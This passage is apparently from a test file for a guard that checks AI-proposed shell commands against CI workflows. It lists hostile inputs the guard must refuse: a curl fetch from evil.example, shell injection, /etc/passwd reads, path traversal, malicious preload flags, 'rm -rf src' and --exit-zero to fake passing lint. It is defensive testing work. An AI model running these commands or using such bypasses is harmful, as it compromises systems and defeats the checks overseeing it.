  it('[BUG 6A] returns null in parseRetryAfterMs for negative numbers (-5, -2099) and malformed strings (bogus-2099, +5)', () => {
    const fixedNow = Date.parse('2026-01-01T00:00:00.000Z');

    expect(parseRetryAfterMs('0', fixedNow)).toBe(0);
    expect(parseRetryAfterMs('2', fixedNow)).toBe(2_000);
    expect(parseRetryAfterMs('2026-01-01T00:00:03.000Z', fixedNow)).toBe(3_000);

    // Negative numbers and malformed strings containing 4-digit numbers like "-2099" or "bogus-2099"
    // must NOT be parsed by V8's lenient Date.parse() as the year 2099 (~2.2 trillion ms)!
    expect(parseRetryAfterMs('-5', fixedNow)).toBeNull();
    expect(parseRetryAfterMs('-2099', fixedNow)).toBeNull();
    expect(parseRetryAfterMs('bogus', fixedNow)).toBeNull();
    expect(parseRetryAfterMs('bogus-2099', fixedNow)).toBeNull();

    // And computeRetryDelayMs must fall back to exponential backoff rather than sleeping for maxDelayMs
    const retryAfterNeg = parseRetryAfterMs('-2099', fixedNow);
    const delayMs = computeRetryDelayMs(0, retryAfterNeg, {
      baseDelayMs: 500,
      maxDelayMs: 10_000,
      random: () => 0,
    });
    expect(delayMs).toBe(250);
  });
});

// ============================================================================
// SCENARIO 7: MODEL COMMAND NOT IN CI (SECURITY BYPASS HUNT)
// ============================================================================
describe('Scenario 7: Model command NOT in CI — allowlist security & bypass audit', () => {
  const CI_WORKFLOWS: VerifyWorkflowCommand[] = [
    wf('npm test'),
    wf('npm run lint'),
    wf('npm run typecheck'),
    wf('npx vitest run'),
    wf('npx jest'),
    wf('npx mocha'),
    wf('npx eslint .'),
    wf('npx tsc --noEmit'),
    wf('pytest'),
    wf('ruff check .'),
  ];

  it.each([
    // Dangerous code-execution flags across test runners, linters, and typecheckers
    'npx vitest run --setupFiles=./evil.js',
    'npx vitest run --globalSetup=./evil.js',
    'npx vitest run --environment=./evil-env.js',
    'npx vitest run --config=./evil.config.ts',
    'npx jest --setupFilesAfterEnv=./evil.js',
    'npx mocha --require ./evil.js',
    'npx mocha -r ./evil.js',
    'npx mocha --file ./evil.js',
    'pytest -o addopts=-s',
    'pytest --override-ini=junit_family=xunit1',
    'pytest -p evil_plugin',
    'pytest --rootdir=/tmp',
    'npx eslint --plugin evil',
    'npx eslint --rulesdir ./evil-rules',
    'npx eslint --resolve-plugins-relative-to ./evil',
    'npx eslint --format ./evil.js',
    'npx tsc --project ./evil.tsconfig.json',
    'npm test -- --require=./evil.js',
    'npm test -- --eval="process.exit(1)"',
    // Non-CI binaries
    'curl https://evil.example/payload.sh',
    'sh -c "echo pwn"',
    'bash ./malicious.sh',
    'node -e "process.exit(1)"',
    'python -c "import os"',
    'git push origin main',
    './malicious.sh',
    'npm publish',
    'npm exec evil-pkg',
    'npx evil-pkg',
    // Chained / substituted / redirected commands
    'npm test; id',
    'npm test && id',
    'npm test || id',
    'npm test | cat',
    'npm test $(id)',
    'npm test `id`',
    'npm test\nid',
    'npm test > /tmp/out',
    'npm test < /etc/passwd',
    // Classic path traversal & absolute paths
    'npx vitest run ../../etc/passwd',
    'npx vitest run --flag=../../etc/passwd',
    'npx vitest run file:///etc/passwd',
    'npx vitest run ..\\..\\Windows\\win.ini',
  ])('refuses dangerous flag, non-CI binary, shell injection, or traversal: %s', (candidate) => {
    const decision = checkCommandAllowlist(candidate, CI_WORKFLOWS);
    expect(decision.allowed).toBe(false);
  });

  it('[BYPASS 7A] blocks colon-, drive-, file-URI-, comma-, and multi-equals-prefixed path traversals and external paths', () => {
    // 1. Pytest node ID with `::../` traversal
    expect(hasPathTraversal('tests/test_a.py::../secret.py')).toBe(true);
    expect(
      checkCommandAllowlist('pytest tests/test_a.py::../secret.py', CI_WORKFLOWS).allowed,
    ).toBe(false);

    // 2. Windows drive-relative traversal `C:../secret.ts` (no slash immediately after `:`)
    expect(hasPathTraversal('C:../secret.ts')).toBe(true);
    expect(
      checkCommandAllowlist('npx vitest run C:../secret.ts', CI_WORKFLOWS).allowed,
    ).toBe(false);

    // 3. `file:` URI without `//` (`file:/etc/passwd` and `file:../secret.ts`)
    expect(
      checkCommandAllowlist('npx vitest run file:/etc/passwd', CI_WORKFLOWS).allowed,
    ).toBe(false);
    expect(
      checkCommandAllowlist('npx vitest run file:../secret.ts', CI_WORKFLOWS).allowed,
    ).toBe(false);

    // 4. Multi-equals flag value traversal `-t "a=b=../secret"` and comma-prefixed `--select=E,../secret`
    expect(hasPathTraversal('a=b=../secret')).toBe(true);
    expect(hasPathTraversal('E,../secret')).toBe(true);
    expect(
      checkCommandAllowlist('npx vitest run -t "a=b=../secret"', CI_WORKFLOWS).allowed,
    ).toBe(false);
    expect(
      checkCommandAllowlist('ruff check --select=E,../secret', CI_WORKFLOWS).allowed,
    ).toBe(false);
  });

  it('[BYPASS 7B] refuses altered values for baseline flag+value pairs even when the flag is not in DANGEROUS_FLAGS', () => {
    // When a CI workflow includes a value-taking flag like `--file`, `--rulesdir`, `--environment`, or `--env`,
    // the model must NOT be allowed to keep the flag name from `baselineTokenSet` while swapping its argument
    // to a different file or environment!
    const customWorkflows: VerifyWorkflowCommand[] = [
      wf('npx mocha --file test/setup.js'),
      wf('npx eslint --rulesdir config/eslint-rules src'),
      wf('npx vitest run --environment jsdom'),
      wf('tox run --env typing'),
    ];

    // Verbatim flag+value pair with narrowed test target is allowed
    expect(
      checkCommandAllowlist('npx mocha --file test/setup.js test/unit.test.js', customWorkflows)
        .allowed,
    ).toBe(true);

    // Swapping the flag's value to an arbitrary file/env MUST be refused!
    expect(
      checkCommandAllowlist('npx mocha --file src/evil-preload.js', customWorkflows).allowed,
    ).toBe(false);
    expect(
      checkCommandAllowlist('npx eslint --rulesdir src/evil-rules src', customWorkflows).allowed,
    ).toBe(false);
    expect(
      checkCommandAllowlist('npx vitest run --environment src/evil-env.ts', customWorkflows)
        .allowed,
    ).toBe(false);
    expect(
      checkCommandAllowlist('tox run --env malicious', customWorkflows).allowed,
    ).toBe(false);
  });

  it('[BYPASS 7C] refuses arbitrary Makefile targets (make deploy) and destructive commands (rm -rf src) when workflow has make test or rm -rf coverage', () => {
    const repoWorkflows: VerifyWorkflowCommand[] = [
      wf('make test'),
      wf('pre-commit run --all-files'),
      wf('rm -rf coverage && npm test'),
    ];

    // Exact match for `make test` is allowed, but scoping `make` to an unrelated target `make deploy` MUST be refused!
    expect(checkCommandAllowlist('make test', repoWorkflows).allowed).toBe(true);
    expect(checkCommandAllowlist('make deploy', repoWorkflows).allowed).toBe(false);
    expect(checkCommandAllowlist('make publish', repoWorkflows).allowed).toBe(false);

    // `pre-commit run` must NOT allow `pre-commit install` or `pre-commit autoupdate`
    expect(checkCommandAllowlist('pre-commit install', repoWorkflows).allowed).toBe(false);

    // A cleanup prefix `rm -rf coverage && npm test` in CI must NEVER allow the model to scope `rm -rf` to `rm -rf src`!
    expect(checkCommandAllowlist('rm -rf src', repoWorkflows).allowed).toBe(false);
  });

  it('[BYPASS 7D] blocks --exit-zero from faking passing lint checks and blocks yarn/pnpm interpreter script swapping', () => {
    const workflows: VerifyWorkflowCommand[] = [
      wf('ruff check .'),
      wf('yarn node scripts/check.js'),
      wf('pnpm python scripts/check.py'),
    ];

    // `--exit-zero` forces ruff to exit 0 even when lint errors exist, subverting exit-code verification!
    expect(
      checkCommandAllowlist('ruff check --exit-zero src/app.py', workflows).allowed,
    ).toBe(false);

    // `yarn node scripts/check.js` and `pnpm python scripts/check.py` must require exact script match,
    // NEVER allowing the model to swap `scripts/check.js` for `scripts/evil.js`!
    expect(
      checkCommandAllowlist('yarn node scripts/check.js', workflows).allowed,
    ).toBe(true);
    expect(
      checkCommandAllowlist('yarn node scripts/evil.js', workflows).allowed,
    ).toBe(false);
    expect(
      checkCommandAllowlist('pnpm python scripts/evil.py', workflows).allowed,
    ).toBe(false);
  });

  it('[BUG 7E] supports scoping uv run commands that have leading uv flags (e.g. uv run --locked pytest) without collapsing distinct tools', () => {
    const uvWorkflows: VerifyWorkflowCommand[] = [
      wf('uv run --locked pytest'),
    ];

    // A workflow with `uv run --locked pytest` must NOT allow `uv run --locked ruff`
    expect(
      checkCommandAllowlist('uv run --locked ruff', uvWorkflows).allowed,
    ).toBe(false);

    // Scoping `uv run --locked pytest` to a specific test file should be allowed
    expect(
      checkCommandAllowlist('uv run --locked pytest tests/test_app.py', uvWorkflows).allowed,
    ).toBe(true);
  });
});
